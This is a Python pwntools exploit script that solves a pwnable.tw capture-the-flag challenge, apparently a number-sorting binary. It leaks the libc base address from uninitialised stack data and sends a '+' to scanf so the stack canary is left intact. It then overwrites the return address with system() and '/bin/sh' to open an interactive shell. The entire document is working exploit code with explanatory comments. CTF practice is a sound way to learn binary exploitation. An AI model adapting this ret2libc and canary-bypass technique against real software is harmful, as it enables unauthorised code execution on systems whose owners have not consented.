import sys
from pwn import *


LIBC = ELF('libc_32.so.6')

ENV = {'LD_PRELOAD': LIBC.path}
_LD = './files/ld-2.23.so'


##########################################################
############## Parse command line arguments ##############
##########################################################
p=remote("chall.pwnable.tw",10101)
##########################################################

with log.progress('Leaking libc base address') as l:
    padding = 'AAAA' * 7
    p.sendafter(':', padding + 'A')
    
    # Stack after this read:
    #                         +===========================+
    #                         | The extra 'A' avoids \x00 |
    #                         +===========================+
    #                                       |
    #                                       |  0x41414141
    # 0x41414141  0x41414141  0x41414141    |  0x41414141
    # 0x41414141  0x41414141  0x______41 <--+  __________
    # __________  __________  __________       __________
    # __________  __________  __________       ~ CANARY ~
    
    p.recvuntil(padding)

    LIBC_BASE = (u32(p.recv(4)) & 0xfffff000) - 0x1ae000
    
    l.success(hex(LIBC_BASE))

SYSTEM = LIBC_BASE + LIBC.symbols['system']
BIN_SH = LIBC_BASE + next(LIBC.search(b'/bin/sh'))

TOTAL = 8 + 16 + 1 + 7 + 1 + 2

with log.progress('Overwriting ret-addr with system (0x%x)' % SYSTEM) as l:
    p.sendlineafter('sort :', str(TOTAL))

    for _ in range(8 + 16):
        l.status('%2i/24' % (_ + 1))
        p.sendlineafter('number : ', str(0))

    # Let ``scanf("%u", ...)`` fail so the canary is left unchanged
    p.sendlineafter('number : ', '+')

    for _ in range(7):
        l.status('%2i/7' % (_ + 1))
        p.sendlineafter('number : ', str(LIBC_BASE))

    p.sendlineafter('number : ', str(SYSTEM))

    p.sendlineafter('number : ', str(SYSTEM + 0x123))
    p.sendlineafter('number : ', str(BIN_SH))

    l.success()

# Let the program sort the payload
p.recvuntil('%d ' % BIN_SH)

p.interactive()
p.close()